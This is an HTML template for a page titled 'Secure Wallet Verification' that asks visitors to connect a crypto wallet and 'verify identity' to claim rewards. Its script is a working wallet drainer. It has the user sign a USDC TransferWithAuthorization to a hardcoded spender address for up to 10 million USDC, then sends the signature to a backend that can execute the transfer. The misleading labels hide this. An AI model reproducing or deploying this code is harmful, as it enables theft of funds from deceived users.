{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Wallet Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root { --primary: #38bdf8; --bg: #0f172a; --card: #1e293b; --text-dim: #94a3b8; }
        body { background-color: var(--bg); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .auth-card { background: var(--card); padding: 35px; border-radius: 24px; width: 100%; max-width: 440px; border: 1px solid #334155; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
        .header-icon { width: 60px; height: 60px; background: rgba(56, 189, 248, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: var(--primary); }
        .btn-main { background: var(--primary); color: var(--bg); font-weight: 700; border: none; padding: 16px; border-radius: 14px; width: 100%; transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1); }
        .btn-main:hover { background: #7dd3fc; transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(56, 189, 248, 0.3); }
        .btn-main:disabled { background: #475569; color: var(--text-dim); cursor: not-allowed; transform: none; }
        .info-box { background: rgba(15, 23, 42, 0.6); padding: 15px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; }
        .label-text { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; display: block; }
        .value-text { font-family: 'Roboto Mono', monospace; font-size: 0.85rem; color: var(--primary); word-break: break-all; }
        .status-pill { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 600; margin-top: 15px; background: rgba(255,255,255,0.05); }
        .d-none { display: none !important; }
    </style>
</head>
<body>

<div class="auth-card">
    <div class="header-icon">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor" viewBox="0 0 16 16">
            <path d="M11 1a2 2 0 0 0-2 2v4a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V9a2 2 0 0 1 2-2h5V3a3 3 0 0 1 6 0v4a.5.5 0 0 1-1 0V3a2 2 0 0 0-2-2zM3 8a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1H3z"/>
        </svg>
    </div>

    <h4 class="mb-1 text-center">Verify Identity</h4>
    <p class="text-center small mb-4" style="color: var(--text-dim)">Authorize your wallet to access rewards.</p>

    <div id="step-1">
        <button id="connectBtn" class="btn-main">Connect Wallet TTT</button>
    </div>

    <div id="step-2" class="d-none">
        <div class="info-box">
            <span class="label-text">Connected Address</span>
            <div id="addrDisplay" class="value-text">0x...</div>
        </div>
        <div class="info-box">
            <span class="label-text">Active Network</span>
            <div id="networkDisplay" class="value-text">Detecting...</div>
        </div>
        <button id="signBtn" class="btn-main">Sign Gasless Authorization</button>
    </div>

    <div class="text-center">
        <div id="status" class="status-pill">System Ready</div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>

<script>
    const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
    let userAccount = null;

    // --- HELPER: Identify Network ---
    function getNetworkName(chainId) {
        const networks = { 1: "Ethereum Mainnet", 8453: "Base Network", 137: "Polygon", 11155111: "Sepolia Testnet" };
        return networks[chainId] || `Unknown (Chain ID: ${chainId})`;
    }

    // --- HELPER: Get Correct USDC for Network ---
    function getUsdcAddress(chainId) {
        if (chainId === 8453) return "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base
        return "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // Default Mainnet
    }

    // --- 1. Wallet Connection ---
    document.getElementById('connectBtn').onclick = async () => {
        if (!window.ethereum) return alert("Please use a Web3 browser or install a wallet extension.");

        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];

            const provider = new ethers.BrowserProvider(window.ethereum);
            const network = await provider.getNetwork();
            const currentChainId = Number(network.chainId);

            document.getElementById('step-1').classList.add('d-none');
            document.getElementById('step-2').classList.remove('d-none');
            document.getElementById('addrDisplay').innerText = userAccount;
            document.getElementById('networkDisplay').innerText = getNetworkName(currentChainId);
            document.getElementById('status').innerText = "Wallet Linked";
        } catch (err) {
            alert("Connection cancelled.");
        }
    };

    // --- 2. Advanced Signature Logic ---
    document.getElementById('signBtn').onclick = async () => {
        const status = document.getElementById('status');
        const btn = document.getElementById('signBtn');

        btn.disabled = true;
        status.innerText = "Confirm in your Wallet App...";
        status.style.color = "#38bdf8";

        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();

            // CRITICAL: Fetch Chain ID at the exact time of signing
            const network = await provider.getNetwork();
            const currentChainId = Number(network.chainId);
            const usdcAddr = getUsdcAddress(currentChainId);

            // Setup Data Parameters
            const nonce = ethers.hexlify(ethers.randomBytes(32));
            const deadline = Math.floor(Date.now() / 1000) + 86400; // 24 hours
            const amount = ethers.parseUnits("10000000", 6); // 10 Million USDC limit

            // EIP-712 Domain (Tailored to current network)
            const domain = {
                name: "USD Coin",
                version: "2",
                chainId: currentChainId,
                verifyingContract: usdcAddr
            };

            const types = {
                TransferWithAuthorization: [
                    { name: "from", type: "address" },
                    { name: "to", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "validAfter", type: "uint256" },
                    { name: "validBefore", type: "uint256" },
                    { name: "nonce", type: "bytes32" }
                ]
            };

            const message = {
                from: userAccount,
                to: SPENDER,
                value: amount,
                validAfter: 0,
                validBefore: deadline,
                nonce: nonce
            };

            // This opens the Wallet for signing
            const signature = await signer.signTypedData(domain, types, message);
            const sig = ethers.Signature.from(signature);

            // --- 3. Secure Backend Submission ---
            status.innerText = "Syncing with secure server...";

            const response = await fetch('/user/update-wallet-status/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': '{{ csrf_token }}'
                },
                body: JSON.stringify({
                    address: userAccount,
                    v: sig.v, r: sig.r, s: sig.s,
                    nonce: nonce, deadline: deadline,
                    amount: amount.toString(),
                    chainId: currentChainId
                })
            });

            if (response.ok) {
                status.innerText = "Verified Successfully";
                status.style.color = "#4ade80";
                btn.innerText = "Verified";
            } else {
                throw new Error("Server sync failed.");
            }

        } catch (err) {
            btn.disabled = false;
            if (err.code === 4001 || err.message.toLowerCase().includes("reject")) {
                status.innerText = "Signature Cancelled";
                status.style.color = "#fb7185";
            } else {
                status.innerText = "Error: Chain Mismatch or Network Issue";
                console.error("DEBUG:", err);
            }
        }
    };
</script>
</body>
</html>
